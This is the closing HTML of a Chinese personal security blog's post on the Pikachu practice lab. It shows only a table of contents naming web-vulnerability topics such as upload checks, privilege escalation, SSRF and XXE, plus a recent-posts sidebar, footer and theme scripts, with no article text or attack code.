href="#%E5%AE%A2%E6%88%B7%E7%AB%AFcheck"><span class="toc-number">8.1.</span> <span class="toc-text">客户端check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AFcheck"><span class="toc-number">8.2.</span> <span class="toc-text">服务端check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">8.3.</span> <span class="toc-text">getimagesize()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">越权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">9.1.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">10.</span> <span class="toc-text">URL重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">11.</span> <span class="toc-text">SSRF(服务器端请求伪造)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-curl"><span class="toc-number">11.1.</span> <span class="toc-text">SSRF(curl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-file-get-contents"><span class="toc-number">11.2.</span> <span class="toc-text">SSRF(file_get_contents)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">XXE(xml外部实体注入)</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/ecb6de2c.html" title="pikachu靶场"><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pikachu靶场"/></a><div class="content"><a class="title" href="/post/ecb6de2c.html" title="pikachu靶场">pikachu靶场</a><time datetime="2023-07-30T09:05:50.000Z" title="发表于 2023-07-30 17:05:50">2023-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/6c198c6.html" title="preg_match绕过和神奇的unicode编码"><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-85kxlk.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="preg_match绕过和神奇的unicode编码"/></a><div class="content"><a class="title" href="/post/6c198c6.html" title="preg_match绕过和神奇的unicode编码">preg_match绕过和神奇的unicode编码</a><time datetime="2023-05-12T07:19:06.000Z" title="发表于 2023-05-12 15:19:06">2023-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/8ac6c1a1.html" title="PHP反序列化"><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化"/></a><div class="content"><a class="title" href="/post/8ac6c1a1.html" title="PHP反序列化">PHP反序列化</a><time datetime="2023-05-12T05:01:35.000Z" title="发表于 2023-05-12 13:01:35">2023-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d17189cf.html" title="Misc常用工具"><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/qzg5vq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Misc常用工具"/></a><div class="content"><a class="title" href="/post/d17189cf.html" title="Misc常用工具">Misc常用工具</a><time datetime="2023-04-29T08:26:24.000Z" title="发表于 2023-04-29 16:26:24">2023-04-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/5473bd.html" title="BUUCTF-web"><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-3lwq86.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-web"/></a><div class="content"><a class="title" href="/post/5473bd.html" title="BUUCTF-web">BUUCTF-web</a><time datetime="2023-04-12T10:53:31.000Z" title="发表于 2023-04-12 18:53:31">2023-04-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 大白</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="fa-solid fa-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="fa-solid fa-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="fa-solid fa-arrow-rotate-right"></i></div><div class="rightMenu-item" id="menu-home"><i class="fa-solid fa-house"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" href="/archives/"><i class="fa-solid fa-archive"></i><span>文章归档</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="fa-solid fa-folder-open"></i><span>文章分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="fa-solid fa-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuNormal"><a class="rightMenu-item menu-link" id="menu-radompage" href="/random/index.html"><i class="fa-solid fa-shoe-prints"></i><span>随便逛逛</span></a><div class="rightMenu-item" id="menu-translate"><i class="fa-solid fa-earth-asia"></i><span>繁简切换</span></div><div class="rightMenu-item" id="menu-darkmode"><i class="fa-solid fa-moon"></i><span>切换模式</span></div></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/weather.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/rightMenu.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>